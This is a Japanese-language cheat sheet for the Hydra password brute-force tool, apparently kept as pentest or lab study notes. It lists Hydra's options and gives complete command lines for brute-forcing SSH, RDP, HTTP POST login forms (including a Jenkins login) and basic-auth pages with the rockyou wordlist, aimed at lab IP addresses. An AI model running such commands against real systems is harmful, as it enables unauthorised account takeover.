# hydra
[Documentation](https://github.com/vanhauser-thc/thc-hydra)

## 概要
C言語ベースのパスワードブルートフォース用のツール

## コマンド集

-l => 単一のユーザ名を指定  
-P => パスワードのワードリストを指定  
-s => ポートを指定  
-L => ユーザ名のリストを指定(複数のユーザ名を指定)  

例
```
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
```

```
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
```

POSTを要求するエンドポイントで実行するコマンド
```
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:rm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

basic認証でGETリクエストをブルートフォースすることもできる
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.221.201 http-get 
```

1. -Vで冗長、-fでパスワードが見つかったらストップ、-lで自身が指定したユーザ名(今回はadmin)を指定。-Pでワードリストを使用。  
以降のhttp-post-formは、Burpでとってきた <エンドポイントAPIのパス>:<Burpから調査したPOSTリクエストのPOSTデータ、なお、usernameとpasswordは^USER^と^PASS^で囲む>:<任意のログイン失敗時のメッセージ>
```
hydra -V -f -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.63 http-post-form '/askjeeves/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2Faskjeeves%2F&Jenkins-Crumb=c994e904963e4d08c280c8aa58e92add&json=%7B%22j_username%22%3A+%22admin%22%2C+%22j_password%22%3A+%22password%22%2C+%22remember_me%22%3A+false%2C+%22from%22%3A+%22%2Faskjeeves%2F%22%2C+%22Jenkins-Crumb%22%3A+%22c994e904963e4d08c280c8aa58e92add%22%7D&Submit=log+in:Invalid login information. Please try again.'
```